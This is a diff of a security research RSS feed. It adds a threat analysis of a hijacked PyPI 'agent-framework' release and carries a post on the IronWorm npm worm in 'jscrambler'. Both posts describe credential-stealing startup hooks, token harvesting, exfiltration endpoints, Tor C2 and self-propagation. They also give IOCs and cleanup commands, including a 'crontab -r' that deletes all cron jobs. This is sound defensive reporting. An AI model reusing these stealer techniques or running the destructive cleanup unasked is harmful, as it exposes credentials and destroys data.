@@ -4,11 +4,170 @@
         <title>JFrog Security Real Time Posts</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest security real-time threat posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 18 Nov 2026 09:27:34 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 18 Nov 2026 14:25:36 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/post/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Microsoft's agent-framework Hijacked on PyPI via Silent .pth Startup Hook]]></title>
+            <link>https://research.jfrog.com/post/agent-framework-hijack/</link>
+            <guid>https://research.jfrog.com/post/agent-framework-hijack/</guid>
+            <pubDate>Wed, 18 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[The JFrog Security Research team analyzed the supply chain hijack of Microsoft's agent-framework package on PyPI. Compromised versions 1.26.1 and 1.26.2 use Python .pth startup hooks to harvest Azure identities, CI/CD tokens, and AI developer secrets on every Python launch. If you installed either version, assume your environment is compromised.]]></description>
+            <content:encoded><![CDATA[
+The JFrog Security Research team analyzed a supply chain attack targeting Microsoft's `agent-framework` package on PyPI, which receives roughly 40,000 weekly downloads. Rather than compromising Microsoft's build pipeline, the attacker repacked the clean wheel locally and published versions `1.26.1` and `1.26.2` with a `.pth` startup hook that runs a background credential stealer every time Python starts, even when your code never imports `agent_framework`. If you installed either version on a workstation, CI/CD runner, or container image, you must assume your environment and accessible cloud credentials are compromised.
+
+![][image1]
+
+Both unauthorized wheel-only releases went live on November 17, 2026. Version `1.26.1` landed on PyPI at `20:35 UTC`, and PyPI quarantined it 31 minutes later at `21:06 UTC`. The attacker uploaded `1.26.2` two minutes after that at `21:08 UTC`, and PyPI removed both releases by `21:16 UTC`. Automated dependency bots such as Renovate were already opening upgrade pull requests in downstream repositories within six minutes of `1.26.1` landing on PyPI.
+
+## Technical analysis
+
+### Why the meta-package needed a .pth hook
+
+`agent-framework` is the top-level meta-package recommended in Microsoft's quick-install instructions. It does not contain the core SDK code. Instead, `agent-framework-core` provides the `agent_framework` namespace that developers import, while the `agent-framework` wheel installs a small stub module named `agent_framework_meta` that only exposes `__version__` and pins `Requires-Dist: agent-framework-core[all]==1.26.0`.
+
+Because applications run `import agent_framework` and never import `agent_framework_meta`, hiding malicious code inside `agent_framework_meta/__init__.py` alone would never execute in normal workloads.
+
+In `1.26.1`, the attacker left the `agent-framework-core[all]==1.26.0` dependency pin untouched so the framework keeps working without errors. They appended a silent `_telemetry._start()` call to `agent_framework_meta/__init__.py` and added a 28-byte `agent_framework_meta.pth` file to the root of `site-packages` containing `import agent_framework_meta`:
+
+![Malicious _telemetry._start() hook appended to agent_framework_meta/__init__.py][image2]
+
+During CPython initialization, `site.py` scans `site-packages` for `.pth` files and passes any line starting with `import` to `exec()` before `sitecustomize` or user scripts run. Installing the wheel does not execute code on its own, but the next Python command in that environment triggers the stealer, including `python`, `pytest`, IDE language servers, container entrypoints, and `pip`.
+
+ZIP headers confirm the `1.26.1` wheel came from a local script rather than Microsoft's Azure DevOps and ESRP release pipeline. Although the `WHEEL` file still claims `Generator: flit 4.2.0`, Info-ZIP `zip 3.0` headers show the attacker repacked the archive at `20:26:19 UTC` on November 17, nine minutes before upload, under Unix `uid=1000` on a host with a `UTC+8` clock.
+
+That scripted build let the operator push `1.26.2` two minutes after PyPI quarantined `1.26.1`. Quarantining a single version on PyPI does not revoke the compromised publishing credential or prevent the attacker from pushing newer versions. In `1.26.2`, the attacker restored the clean `__init__.py` file and moved the startup hook to `af_runtime_diag.pth` and `af_runtime_diag.py`.
+
+### Detached execution and repeat triggers
+
+When `_telemetry._start()` runs, it checks whether `_AF_TEL` is set in `os.environ`. If unset, it sets `_AF_TEL="1"` so child processes in the same process tree do not trigger a fork loop. On Linux and macOS, it calls `os.fork()`, detaches into a new session via `os.setsid()`, runs the collector, and exits the child with `os._exit(0)` while the parent process continues immediately. On Windows, where `os.fork()` is unavailable, it starts a daemon thread.
+
+Our sandbox runs confirmed `_telemetry.py` writes zero lockfiles or markers to disk. Every independent Python launch without `_AF_TEL=1` runs the collector and exfiltrates secrets again.
+
+### Targeting Azure, CI/CD, and AI developer secrets
+
+On startup, `_collect()` records the hostname, username, working directory, and `sys.argv[:20]`, then sweeps `os.environ` for 31 case-insensitive substrings covering Azure, AWS, GitHub, OpenAI, Microsoft Foundry, Hugging Face, Cosmos DB, and package registry credentials. Because `KEY`, `TOKEN`, and `SECRET` match broadly, the script also captures third-party LLM keys such as `ANTHROPIC_API_KEY` and `GEMINI_API_KEY` alongside GitHub Actions `ACTIONS_ID_TOKEN_REQUEST_*` variables. Version `1.26.2` expanded this scope to GitHub Actions OIDC tokens and `/home/runner` paths.
+
+Next, the collector evaluates 35 glob patterns, reading up to 60 files under 256 KiB, raised to 80 files in `1.26.2`:
+
+![Filesystem credential globs targeting Azure, Hugging Face, Foundry, and Azure DevOps agents][image3]
+
+The file search targets four credential groups:
+
+- `~/.azure/*.json` token caches, Hugging Face tokens, and Microsoft Foundry configs.  
+- Package, Git, and container configs in `pip.conf`, `.npmrc`, `.netrc`, `.git-credentials`, and `.docker/config.json`.  
+- Containerized application configs matching `/app/.env`, `/app/*.json`, `/workspace/.env`, and `/workspace/*.json`.  
+- Self-hosted Azure DevOps agent `.credentials` stores, including `/mnt/azure_nvme_temp/_work` runner paths.
+
+On Linux, `_collect()` also reads the first 300 `/proc/[0-9]*/environ` entries to pull secrets from other running processes. It then queries Azure App Service `IDENTITY_ENDPOINT` or `MSI_ENDPOINT` variables, or falls back to the Azure VM Instance Metadata Service at `169[.]254[.]169[.]254`, requesting live OAuth2 tokens across 12 token audiences including Azure Resource Manager, Azure AI Foundry, Key Vault, Storage, Microsoft Graph, and Azure DevOps:
+
+![Azure App Service Managed Identity and VM IMDS token harvesting loop][image4]
+
+### Plaintext webhook.site exfiltration and operator blunders
+
+Rather than operating custom infrastructure, `_telemetry.py` Base64-decodes `_ENC` to `hxxps[:]//webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb`. It serializes the harvested data to JSON, compresses it with `zlib`, Base64-encodes the result with no encryption, and sends an HTTPS `POST` to `?t=telemetry` with `User-Agent: af-runtime-diagnostics/1`, changed to `runtime-diagnostics/1` in `1.26.2`:
+
+![Base64 webhook.site URL and unencrypted zlib exfiltration in _telemetry.py][image5]
+
+The script discards the response body. We found no second-stage loader, no persistence outside `site-packages`, and no worm propagation.
+
+Closer inspection of the code and drop endpoint revealed four operational mistakes:
+
+- **Rate-limited `webhook[.]site` dropbox.** When we checked the URL, it returned `HTTP 429` with `Error: Request limit exceeded. Sign up to unlock more requests.` Early victims before the cap hit still delivered unencrypted secret bundles over `HTTP 200`, and free `webhook[.]site` inboxes without subscription controls can expose captured requests to anyone holding the UUID.  
+- **Broken Azure DevOps OIDC request.** The script posts to `SYSTEM_OIDCREQUESTURI?api-version=7.1` without the required `serviceConnectionId` parameter, so real Azure DevOps endpoints reject it with `HTTP 400`. `SYSTEM_ACCESSTOKEN` itself still leaks through `os.environ` when mapped into a pipeline step.  
+- **104-second IMDS delay and Windows thread drop.** On non-Azure Linux hosts that drop packets to `169[.]254[.]169[.]254`, 13 sequential eight-second timeouts stall the detached child for about 104 seconds before exfiltration starts, though the parent command does not wait. On Windows, short CLI commands exit before the daemon thread finishes those timeouts.  
+- **Linux-centric file globs.** Thirty-three of the 35 globs are absolute Linux paths that miss `/Users/*` on macOS for `.npmrc`, `.git-credentials`, and Hugging Face tokens. macOS hosts still leak `os.environ` and plaintext `~/.azure/*.json` token caches.
+
+## Remediation guidance
+
+If your environment installed `agent-framework` `1.26.1` or `1.26.2`, treat every secret reachable from that host, container, or runner as compromised and take these steps immediately.
+
+### Step 1: Neutralize the .pth hook and remove the package
+
+Do not run bare `pip uninstall` in an infected environment first. Because `pip` is a Python entrypoint, launching it loads `site.py`, processes the `.pth` hook, and runs the stealer one more time before uninstalling. Export `_AF_TEL=1` first to block both `1.26.1` and `1.26.2`, and run the cleanup using the affected environment's Python binary, such as `.venv/bin/python`:
+
+```sh
+export _AF_TEL=1
+PY_BIN=".venv/bin/python"  # or python3 for active/system environments
+"$PY_BIN" -c '
+import pathlib, shutil, site
+dirs = set(site.getsitepackages() + [site.getusersitepackages()])
+files = ("agent_framework_meta.pth", "agent_framework_meta/_telemetry.py", "af_runtime_diag.pth", "af_runtime_diag.py")
+for d in dirs:
+    base = pathlib.Path(d)
+    for f in files:
+        (base / f).unlink(missing_ok=True)
+    shutil.rmtree(base / "agent_framework_meta" / "__pycache__", ignore_errors=True)
+    for pyc in (base / "__pycache__").glob("af_runtime_diag.*.pyc"):
+        pyc.unlink(missing_ok=True)
+'
+"$PY_BIN" -m pip uninstall -y agent-framework
+"$PY_BIN" -m pip cache remove agent_framework
+"$PY_BIN" -m pip install --no-cache-dir "agent-framework==1.26.0"
+```
+
+If you manage environments with `uv`, `uv` is a compiled Rust binary that does not execute `.pth` hooks during package removal. Run `uv pip uninstall agent-framework && uv cache clean agent-framework` directly, then pin `agent-framework==1.26.0`.
+
+### Step 2: Rotate secrets and audit cloud identities
+
+Rotate every static credential accessible to the affected user, container, or co-located Linux processes:
+
+- Cloud, LLM, and registry keys in environment variables or `.env` files, including Azure, OpenAI, Microsoft Foundry, Anthropic, Hugging Face, AWS, GitHub, npm, NuGet, PyPI, and Docker credentials.  
+- Azure DevOps `SYSTEM_ACCESSTOKEN` secrets, service connections, and self-hosted agent `.credentials` stores; wipe and re-register affected self-hosted runners.  
+- User sessions in Entra ID if `~/.azure/*.json` token caches existed on disk, since rotating passwords or client secrets alone does not revoke cached refresh tokens.  
+- For Azure Managed Identities and federated OIDC workflows, issued access tokens have no static secret to rotate and remain valid until expiry, up to 24 hours. Recycle affected compute instances, review Entra ID Managed Identity sign-in logs across the targeted Azure services, and narrow or remove role assignments if you detect unauthorized replay.
+
+### Step 3: Purge caches, lockfiles, and container images
+
+Removal from PyPI does not clean downstream artifacts cached during the exposure window:
+
+- Block `webhook[.]site` where not required for testing, check DNS logs from build hosts for queries to `webhook[.]site`, and inspect TLS-decrypted proxy logs for `POST` requests to `/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`, where `HTTP 200` confirms completed exfiltration prior to rate-limiting.  
+- Search internal package mirrors and artifact proxies such as JFrog Artifactory remote caches for the malicious wheel SHA-256 digests below and evict them.  
+- Audit lockfiles, Renovate or Dependabot pull requests opened on November 17, and Docker images built during that window; any container image with `1.26.1` or `1.26.2` baked into `site-packages` runs the stealer on every container start. Bytecode `.pyc` files under `__pycache__` do not indicate whether the payload ran, because `pip install` compiles bytecode during installation while `PYTHONDONTWRITEBYTECODE=1` suppresses it at runtime.
+
+## Known malicious packages
+
+| Package Name | Malicious Versions | Xray ID |
+| :---- | :---- | :---- |
+| `agent-framework` | 1.26.1, 1.26.2 | XRAY-1167986 |
+
+## Conclusions
+
+We have not attributed this attack to a known threat group. Both compromised wheels were repacked locally outside Microsoft's normal release pipeline rather than built through upstream CI. Unlike many other supply chain attacks, `agent-framework` `1.26.1` and `1.26.2` carry no payload encryption, no actor markers, no systemd persistence, and no worm propagation. The operator also made several mistakes, including pointing an unthrottled startup hook at a rate-limited `webhook[.]site` inbox, shipping a broken Azure DevOps OIDC request, and hardcoding Linux file paths.
+
+Even with those flaws, one `.pth` line paired with an untouched dependency pin gave the attacker code execution on every Python launch without breaking a single application import. [JFrog Curation](https://jfrog.com/curation/) and JFrog Xray detect and block both compromised versions before they enter build pipelines.
+
+## Indicators of compromise
+
+### Files and packages
+
+
+| Artifact | Version | SHA-256 |
+| :---- | :---- | :---- |
+| `agent_framework-1.26.1-py3-none-any.whl` | 1.26.1 | `d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110` |
+| `agent_framework_meta/_telemetry.py` | 1.26.1 | `39fa329f2a93f734b0bb8f5adb203ea3331d1ae479832a5015a54cb17aabd663` |
+| `agent_framework_meta/__init__.py` | 1.26.1 | `c275ccbe520ef3c0f02dc6a35389e427f9f1b4e0b12e140cd7bf7179ce143f02` |
+| `agent_framework_meta.pth` | 1.26.1 | `21f28e8517a10ffe431f8d68f5875c85eca4001ae6d118322b0a41873998eb5e` |
+| `agent_framework-1.26.2-py3-none-any.whl` | 1.26.2 | `3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9` |
+| `af_runtime_diag.py` | 1.26.2 | `54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f` |
+| `af_runtime_diag.pth` | 1.26.2 | `325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93` |
+
+
+### Network and host indicators
+
+- Exfiltration URL: `hxxps[:]//webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`  
+- HTTP User-Agents: `af-runtime-diagnostics/1` in `1.26.1`, `runtime-diagnostics/1` in `1.26.2`  
+- Malicious `site-packages` files: `agent_framework_meta.pth`, `agent_framework_meta/_telemetry.py`, `af_runtime_diag.pth`, `af_runtime_diag.py`  
+- Runtime process environment marker: `_AF_TEL=1`
+
+[image1]: /img/RealTimePostImage/post/agent-framework-hijack/image1.png
+[image2]: /img/RealTimePostImage/post/agent-framework-hijack/image2.png
+[image3]: /img/RealTimePostImage/post/agent-framework-hijack/image3.png
+[image4]: /img/RealTimePostImage/post/agent-framework-hijack/image4.png
+[image5]: /img/RealTimePostImage/post/agent-framework-hijack/image5.png]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Java4Shell: What We Know About the Critical OpenJDK RCE Vulnerability (CVE-2026-114938)]]></title>
             <link>https://research.jfrog.com/post/java4shell-vulnerability/</link>
@@ -4318,6 +4477,235 @@ The Lucide Proxy campaign illustrates the risks of using third-party unblocking 
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[IronWorm Returns as jscrambler, Rustier Than Ever]]></title>
+            <link>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</link>
+            <guid>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</guid>
+            <pubDate>Sun, 12 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[Only a month after we exposed the IronWorm infostealer, an evolved variant has surfaced in compromised versions of the popular jscrambler npm package. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.]]></description>
+            <content:encoded><![CDATA[
+Only a month after we exposed the [IronWorm infostealer](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), an evolved variant has surfaced in compromised versions of the popular `jscrambler` npm package, resembling similar behavior to Shai-Hulud; like the original version of IronWorm did. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.
+
+<div align="center">
+
+![](/img/RealTimePostImage/post/ironworm/returns.png)
+
+</div>
+
+The attack surfaced via the `jscrambler` package on npm, uploaded on July 11, 2026. Versions 8.14.0, 8.16.0, 8.17.0, 8.18.0, and 8.20.0 all contain `package/dist/intro.js`, which is the bundle that contains the malicious native payload loader.
+
+The implant is an evolved variant of IronWorm, preserving its unusual architecture while significantly expanding platform coverage, persistence mechanisms, and target lists. Here is the breakdown of what has changed and why this new variant shows the attackers are becoming much more sophisticated.
+
+## Shift in packaging: The custom CSI container
+
+The first campaign we analyzed used a Linux x86-64 executable packed with a lightly modified UPX stub. The new variant abandons UPX entirely for cross-platform delivery. Instead, the malicious script in `dist/intro.js` parses a custom container format starting with the magic bytes `1B 43 53 49 01 03 00` (CSI).
+
+This container holds three distinct native payloads:
+* A Linux x86-64 PIE ELF executable
+* A Windows x86-64 PE32+ executable
+* A macOS arm64 Mach-O executable
+
+When the installer runs, the JavaScript loader checks the host operating system using `process.platform`. It selects the corresponding slice of the CSI container, decompresses it via gzip, writes the binary to a hidden temporary path, and executes it as a detached background process.
+
+<div align="center">
+
+![CSI loader JavaScript](/img/RealTimePostImage/post/ironworm/decomp-1.png)
+
+</div>
+
+## Automated npm self-propagation
+
+While the previous variant contained logic for credential theft and potential commit forging, our analysis of the new Linux payload confirms an end-to-end, fully automated npm propagation routine.
+
+Unlike the first variant, which attempted to exchange OIDC identity tokens for Trusted Publishing, this variant goes back to basics but automates it completely. It performs the following steps without needing any local npm command line tools:
+
+1. **Collects npm credentials:** It scans environment variables and files on disk for `NPM_TOKEN`, `NODE_AUTH_TOKEN`, `NPM_CONFIG__AUTHTOKEN`, `NPM_CONFIG_TOKEN`, `NPM_AUTH_TOKEN`, `.npmrc`, `/etc/npmrc`, and `_authToken=`.
+2. **Validates credentials:** It queries `registry.npmjs.org/-/whoami` to verify the token, then lists organizations and packages using `/-/orgs` and `/-/v1/user/<user>/packages`.
+3. **Selects popular targets:** It queries `api.npmjs.org/downloads/point/last-month` to prioritize packages with higher download counts.
+4. **Downloads and infects:** It retrieves the latest `.tgz` archive of the target package, unpacks it, adds a malicious `setup.mjs` script, and rewrites `package.json` to trigger `node setup.mjs` via `scripts.preinstall`.
+5. **Direct registry publication:** Instead of executing `npm publish`, the native payload builds the necessary publication metadata JSON and uploads it directly to `registry.npmjs.org` using a raw HTTP `PUT` request on port 443 with the stolen bearer token.
+
+<div align="center">
+
+![npm registry PUT decompilation](/img/RealTimePostImage/post/ironworm/decomp-2.png)
+
+</div>
+
+## Expanded target set: VPNs, offensive tools, and password managers
+
+The original campaign swept for developer environment keys, cloud credentials, and cryptocurrency wallets (specifically Exodus). The new variant has heavily expanded its targets.
+
+### Active browser-extension wallet theft
+Instead of relying solely on modifying the local desktop Exodus application, the malware uses its unique per-site string encryption to target browser extensions. The encryption routine uses ChaCha20-Poly1305 with a distinct 32-byte key and 12-byte nonce for every single string call site. Decrypting these strings reveals targets such as MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and Trust Wallet (`egjidjbpglichdcondbcbdnbeeppgdph`).
+
+<div align="center">
+
+![Wallet target decryption](/img/RealTimePostImage/post/ironworm/decomp-3.png)
+
+</div>
+
+### VPN and network credentials
+The malware now searches for and exfiltrates WireGuard configuration files (`/etc/wireguard/*.conf`), OpenVPN configurations (`/etc/openvpn`), IPsec secrets (`/etc/ipsec.secrets`), strongSwan configurations, and PPP CHAP/PAP credentials.
+
+### Evolved Tor command and control (C2)
+While the previous variant utilized simple HTTP-based Tor communication, our analysis of the new Linux payload reveals a significantly more sophisticated Tor transport and exfiltration mechanism.
+
+#### Local Tor Expert Bundle management
+When launched, the malware dynamically acquires and manages its own Tor network path rather than relying on a pre-installed client:
+1. It probes localhost to find an open SOCKS port.
+2. If none is available, it connects directly to `archive.torproject.org:443` to download the official Tor Expert Bundle archive (`tor-expert-bundle-<platform>-16.0a7.tar.gz`), extracting the binary and its dependent libraries (`libcrypto.so.3`, `libssl.so.3`, and `libevent`).
+3. It generates a local `.torrc` configuration setting `RunAsDaemon 0`. It launches Tor as a foreground child process, monitoring its standard error until it reads the `Bootstrapped 100%` success signal.
+
+#### Direct SOCKS5 CONNECT negotiation
+To route traffic, the native payload negotiates SOCKS5 handshake requests directly at the socket level. It connects to the local Tor SOCKS proxy and performs authentication negotiation (`05 01 00` requiring a `05 00` no-authentication response) followed by a domain CONNECT request. This instructs Tor to perform the destination DNS resolution directly, concealing the lookup from the host system.
+
+#### Multi-route C2 transport
+The malware supports two distinct Tor-carried communication routes:
+* **HTTP Bootstrap (Route 1):** SOCKS connects to the destination C2 hostname on port 80, followed by a `POST / HTTP/1.0` request containing the 32-byte client public key. Unlike the original IronWorm's `/api/agent` path, this HTTP wrapper has been simplified to use the root `/` path.
+* **Raw Stream (Route 2):** Alternatively, the malware negotiates SOCKS to the destination on port 8080, bypassing HTTP headers entirely to communicate over a raw, structured TCP channel.
+
+#### Layered stream cryptography (X25519 & ChaCha20-Poly1305)
+The communication channel uses layered, application-level encryption inside the Tor stream:
+
+1. **X25519 Public Key Exchange:** The client generates 32 random bytes, clamps them as an X25519 private scalar, and derives its public key. It sends this public key during the bootstrap phase. It decrypts an embedded server public key (`x25519_server_pub`) stored securely in its configuration, so no server public key needs to be exchanged over the wire.
+2. **Directional HKDF Expansion:** The resulting shared secret is expanded into separate client-to-server (`csi-a2s`, `hkdf a2s`) and server-to-client (`csi-s2a`, `hkdf s2a`) key spaces, preventing key reuse.
+3. **ChaCha20-Poly1305 Framing:** Every message is framed with a 4-byte big-endian length, a 12-byte nonce, and a ChaCha20-Poly1305 authenticated ciphertext payload.
+
+Once the encrypted handshaking loop completes, the malware sends an encrypted `hello` JSON payload detailing CPU cores, system locale, active users, and environment info, then enters a loop supporting remote liveness pings, command execution (via `bash`, `python3`, powershell, and `cmd`), and remote command cancellation.
+
+<div align="center">
+
+![SOCKS5 CONNECT and key exchange](/img/RealTimePostImage/post/ironworm/decomp-4.png)
+
+</div>
+
+#### The dual-path exfiltration blunder
+The malware's exfiltration strategy uses a dual-path architecture that is as clever as it is self-defeating. 
+
+For control, commands, and metadata, the implant sticks to the encrypted Tor SOCKS5 channel. The initial system fingerprint, sent as an encrypted `t=hello` packet, contains everything from the hardware ID and active user to the CPU core count, system locale, and local SOCKS port.
+
+But when it comes to bulk exfiltration, the malware authors made a massive opsec blunder. 
+
+Instead of routing large file uploads, source trees, or harvested credential databases through the slow Tor network, the malware bypasses the proxy entirely. It uses the `rustls` library to open a direct, unproxied HTTPS connection to `temp.sh`, a public file-sharing service. It uploads the stolen data using a standard multipart/form-data `POST` request. Once the upload finishes, the malware parses the response for the resulting `https://` URL and transmits that link back to the operator over the Tor C2 stream.
+
+This design has two major implications:
+* **Real IP exposure:** The query to `check.torproject.org/api/ip` to obtain the victim's public IP (which is included in the encrypted `hello` packet) is made directly over TLS, leaking the victim's real, unproxied IP address to the Tor Project's infrastructure before C2 communication even starts.
+* **Network visibility:** Any network monitor or firewall will see the bulk data transfer going straight to a public file host over direct TLS, completely defeating the anonymity of using Tor for the command channel.
+
+Staging stolen data on a public file host also means the operator does not have to host or scale their own storage infrastructure. However, it also means the victim's sensitive secrets are left on a third-party service where they might be exposed if the generated URLs are guessed or the host's logs are audited.
+
+### Tor hidden-service keys
+Separately from launching its own Tor client for C2 communication, the malware now scans the host for Tor configuration files and actively steals private keys associated with third-party onion services. This includes files such as `hs_ed25519_secret_key`, `hs_ed25519_public_key`, and `private_key_ed25519`.
+
+### Offensive-security infrastructure
+In a highly targeted move, the implant searches for local installations and configuration folders of popular red-team and C2 frameworks, including Metasploit, Sliver, Havoc, Mythic, Covenant, AdaptixC2, and Shad0w. This suggests the threat actors are intentionally targeting the workstations of security researchers, penetration testers, and operators.
+
+### Password managers and local key-stores
+The credential scanner now collects local vaults for 1Password and Bitwarden. On Linux systems, it actively queries the KDE Wallet service over D-Bus (`org.kde.KWallet`) and executes `kwallet-query --read-password` to extract passwords directly from the system keyring.
+
+## Broad cross-platform persistence
+
+The previous variant only used basic systemd user services to maintain persistence on Linux systems. The new codebase contains a dedicated, cross-platform persistence engine that deploys different mechanisms depending on the host:
+
+* **Linux:** It attempts to install a systemd system service under `/etc/systemd/system` with `Restart=always`, reloading the daemon and starting it immediately. If that fails, it falls back to a user-level systemd unit under `~/.config/systemd/user` or traditional cron jobs (`/etc/cron.d` or user crontab).
+* **macOS:** It deploys LaunchAgents and LaunchDaemons plist files to ensure execution across user sessions and system boots.
+* **Windows:** It writes its payload directly into the user's Startup folder (`AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`).
+
+## Remediation guidance
+
+If your environment has installed any of the compromised `jscrambler` versions, you must assume your system is compromised and all local credentials are compromised.
+
+### Step 1: Containment
+Cut off the malware's ability to propagate or exfiltrate:
+* **Revoke and rotate ALL secrets and credentials** that were present on the infected host. This includes AWS, Kubernetes, Docker, database, and SSH keys.
+* **Revoke all npm tokens** immediately. Check your npm account's publishing history for unauthorized package versions.
+* Block outgoing connections to the observed C2 IP addresses (`37.27.122.124` and `57.128.246.79`) and Tor onion-routing nodes.
+
+### Step 2: Eradication of persistence
+Depending on your platform, locate and remove the persistence hooks.
+
+On Linux:
+```shell
+# Check and stop systemd services
+systemctl stop malicious-service-name.service
+systemctl disable malicious-service-name.service
+rm -f /etc/systemd/system/malicious-service-name.service
+systemctl daemon-reload
+
+# Check user-level systemd services
+systemctl --user stop pgmon.service
+systemctl --user disable pgmon.service
+rm -f ~/.config/systemd/user/pgmon.service
+systemctl --user daemon-reload
+
+# Check cron jobs
+crontab -r
+rm -f /etc/cron.d/malicious-job
+```
+
+On macOS:
+Identify and delete any unrecognized plist files under:
+* `~/Library/LaunchAgents/`
+* `/Library/LaunchAgents/`
+* `/Library/LaunchDaemons/`
+
+On Windows:
+Check the startup folder and delete any unrecognized executable or shortcut:
+* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+
+### Step 3: Package cleanup and dependency locking
+Purge the compromised `jscrambler` versions from your projects:
+```shell
+# Remove node_modules and clean npm cache
+rm -rf node_modules
+npm cache clean --force
+
+# Force downgrade or update to a clean version (8.21.0 or newer)
+# Avoid the infected range: 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0
+npm install jscrambler@latest
+```
+
+## Known malicious packages
+
+Through our continuous monitoring and threat intelligence pipeline, we have identified the following compromised package versions containing the IronWorm Rust implant:
+
+| Package Name | Malicious Versions | Xray ID |
+| :---- | :---- | :---- |
+| `jscrambler` | 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0 | XRAY-1025905 |
+
+## Conclusions
+
+The evolution of IronWorm into a highly automated, cross-platform threat shows how rapidly modern software supply chain actors are maturing. Transitioning from a single Linux target with standard UPX to a custom three-platform CSI container demonstrates both capability and intent to strike developers regardless of their local operating system.
+
+The automation of the npm propagation pipeline (by writing infected tarballs and uploading them using direct raw HTTP PUT requests) bypasses standard local CLI guardrails and accelerates the infection cycle. Security teams must monitor not just package configuration files, but active network activity originating from local install scripts and build machines.
+
+JFrog Curation customers are protected, as the malicious package versions have been blocked. We will continue monitoring the campaign and updating our intelligence feeds as new variants emerge.
+
+## Indicators of Compromise (IOCs)
+
+### Payloads
+
+| SHA-256 | Description |
+| :---- | :---- |
+| `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86` | Malicious `index.js` file (the `jscrambler` CSI container) |
+| `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd` | Linux x86-64 payload |
+| `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903` | Windows x86-64 payload |
+| `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd` | macOS arm64 payload |
+
+### Network indicators
+
+* `37.27.122.124` (C2 / upload destination)
+* `57.128.246.79` (C2 / upload destination)
+* `archive.torproject.org` (Tor bundle checks)
+* `check.torproject.org` (Tor loop verification)
+
+### Package indicators
+
+* `package/dist/intro.js`
+* `package/dist/setup.js`
+* `setup.mjs`
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry]]></title>
             <link>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</link>
             <guid>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</guid>
@@ -4555,235 +4943,6 @@ MsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST
 EthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST
 Empty-body POST with high-entropy X-Request-Id header and Content-Type application/grpc-web+proto
 ```
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[IronWorm Returns as jscrambler, Rustier Than Ever]]></title>
-            <link>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</link>
-            <guid>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</guid>
-            <pubDate>Sun, 12 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[Only a month after we exposed the IronWorm infostealer, an evolved variant has surfaced in compromised versions of the popular jscrambler npm package. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.]]></description>
-            <content:encoded><![CDATA[
-Only a month after we exposed the [IronWorm infostealer](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), an evolved variant has surfaced in compromised versions of the popular `jscrambler` npm package, resembling similar behavior to Shai-Hulud; like the original version of IronWorm did. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.
-
-<div align="center">
-
-![](/img/RealTimePostImage/post/ironworm/returns.png)
-
-</div>
-
-The attack surfaced via the `jscrambler` package on npm, uploaded on July 11, 2026. Versions 8.14.0, 8.16.0, 8.17.0, 8.18.0, and 8.20.0 all contain `package/dist/intro.js`, which is the bundle that contains the malicious native payload loader.
-
-The implant is an evolved variant of IronWorm, preserving its unusual architecture while significantly expanding platform coverage, persistence mechanisms, and target lists. Here is the breakdown of what has changed and why this new variant shows the attackers are becoming much more sophisticated.
-
-## Shift in packaging: The custom CSI container
-
-The first campaign we analyzed used a Linux x86-64 executable packed with a lightly modified UPX stub. The new variant abandons UPX entirely for cross-platform delivery. Instead, the malicious script in `dist/intro.js` parses a custom container format starting with the magic bytes `1B 43 53 49 01 03 00` (CSI).
-
-This container holds three distinct native payloads:
-* A Linux x86-64 PIE ELF executable
-* A Windows x86-64 PE32+ executable
-* A macOS arm64 Mach-O executable
-
